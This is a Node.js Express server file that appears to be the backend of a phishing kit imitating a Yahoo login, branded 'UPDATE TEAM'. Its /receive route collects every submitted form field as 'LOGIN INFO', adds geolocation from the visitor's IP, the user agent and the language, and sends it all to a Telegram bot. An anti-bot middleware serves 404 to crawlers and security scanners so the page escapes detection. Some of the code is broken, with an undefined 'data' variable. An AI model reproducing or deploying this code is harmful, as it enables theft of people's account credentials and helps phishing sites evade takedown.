const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./Config/settings.js');
const { sendMessageFor } = require('simple-telegram-message');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const requestIP = require('request-ip');
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const { getClientIp } = require('request-ip');
const { botUAList } = require('./Config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./Config/botIP.js');
const { botRefList } = require('./Config/botRef.js');

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        // It's a bot, return a 404 response or handle it as needed
        return res.status(404).send('Not Found');
    } else {
        // It's not a bot, serve the index.html page
        res.sendFile(path.join(__dirname, 'index.html'));
    }
}

// Middlewares
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));

const port = 3000; // You can use any available port
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

app.post('/receive', async (req, res) => {
    let message = '';
    const ipAddress = requestIP.getClientIp(req);

    const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    try {
          const ipAddressInformation = await sendAPIRequest(ipAddress);
          const userAgent = req.headers["user-agent"];
          const systemLang = req.headers["accept-language"];


        message += `IP Address: ${data.ip_address}\n`;
        message += `City: ${data.city}\n`;
        // Add other relevant information as needed

        console.log(data);

        let myObject = req.body;

        message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
            `👤 LOGIN INFO\n`;
        
        const myObjects = Object.keys(myObject);

        for (const key of myObjects) {
            console.log(`${key}: ${myObject[key]}`);
            message += `${key}: ${myObject[key]}\n`;
        }

        message +=  `🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

        // Now you can handle the data or send it as needed
        console.log(message); // This should be inside the 'end' event callback
        const sendMessage = sendMessageFor(botToken, chatId);
        sendMessage(message);

        // Send a response back to the client
        res.send('Data received and processed.');
    } catch (error) {
        console.error(error);
        res.status(500).send('Internal Server Error');
    }
});



function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}


// Middlewares
app.use(antiBotMiddleware);